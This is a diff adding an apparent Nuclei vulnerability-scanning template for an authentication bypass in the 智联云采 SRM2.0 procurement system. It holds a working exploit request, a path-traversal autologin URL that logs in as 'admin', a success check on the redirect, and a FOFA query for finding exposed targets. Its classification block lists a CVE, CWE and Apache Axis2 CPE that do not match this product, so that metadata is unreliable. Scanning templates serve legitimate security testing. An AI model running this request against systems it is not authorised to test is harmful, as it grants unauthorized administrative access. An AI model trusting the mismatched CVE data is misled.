@@ -1,0 +1,34 @@
+id: zlyc-sm2-autologin
+
+info:
+  name: 智联云采SRM2.0 autologin 身份认证绕过
+  author: qwtd
+  severity: high
+  description: 智联云采SRM2.0系统接口autologin存在身份认证绕过漏洞
+  reference:
+    - https://wiki.wy876.cn/#/./%E6%99%BA%E4%BA%92%E8%81%94%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E6%99%BA%E8%81%94%E4%BA%91%E9%87%87SRM2.0%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3autologin%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E
+  classification:
+    cvss-metrics: CVSS:2.0/AV:N/AC:L/Au:N/C:C/I:C/A:C
+    cvss-score: 10
+    cve-id: CVE-2010-0219
+    cwe-id: CWE-255
+    epss-score: 0.975
+    epss-percentile: 0.99974
+    cpe: cpe:2.3:a:apache:axis2:1.3:*:*:*:*:*:*:*
+  metadata:
+    max-request: 2
+    vendor: 智联云采
+    product: SRM2.0
+    fofa-query: title=="SRM 2.0"
+  tags: 智联云采SRM2.0
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/adpweb/static/..;/api/sys/app/autologin?loginName=admin"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(header,"Location: /adpweb/a") && status_code == 302'
